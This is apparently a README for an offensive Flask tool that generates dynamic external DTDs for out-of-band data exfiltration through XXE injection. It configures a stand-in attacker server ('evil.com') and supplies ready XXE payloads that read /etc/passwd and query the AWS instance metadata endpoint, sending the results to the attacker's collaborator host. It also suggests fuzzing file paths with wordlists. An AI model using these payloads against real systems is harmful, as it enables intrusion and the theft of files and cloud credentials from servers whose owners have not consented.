# Dynamic-DTD
A python Flask app that generates dynamic DTDs for easy out-of-band data exfiltration.

Usually when using external DTDs to perform out-of-band data exfiltration with an XXE Injection vulnerability, you have to keep modifying the DTD, updating the external entity to point to new locations (files, internal web resources, etc.) every time you want to exfiltrate something new. This simple python Flask app allows you to create dynamic DTDs based on a single URL parameter, meaning that you can easily use it with your favorite fuzzer and file wordlist, sit back, and watch the data come in.

## Installation

Installation is simple. Just clone this repository, and install flask using pip:

```bash
pip3 install flask
```

## Configuration

In `app.py`, on line 5, change the `collab` variable to the URL of either a Burp collaborator payload, or even just a web server you can view access logs on. Include the scheme, port number if it is non-standard, but leave off the trailing slash ( / ). An example can be seen below:

```
collab = "https://subdomain.evil.com:8443"
```

## Usage

Change to the directory of `app.py` and run the following command, specifying the port you want the server to run on, and the IP of the interface you wish to use.

```bash
flask run -p <port> -h <interface-ip>
```

Once the server is running, you can use the following payload in your XML documents, updating the `<server-ip>`, `<port>`, and `ext` parameter to appropriate values:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<server-ip>:<port>/malicious.dtd?ext=file:///etc/passwd"> %xxe;]>
```

If the attack is successful, the contents of the /etc/passwd file (using the above example) should appear in the access logs of the `collab` server specified earlier. Note that for some parsers, only the first line of the file may get sent.

Once the `<server-ip>` and `<port>` are set in the payload, the value of the `ext` parameter can be fuzzed to try and find different files, or can be replaced by other URI schemes (e.g. http, https). For example, the following payload can be used to try and extract information from the AWS Instance Metadata API:

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<server-ip>:<port>/malicious.dtd?ext=http://169.254.169.254/latest/dynamic/instance-identity/document"> %xxe;]>
```
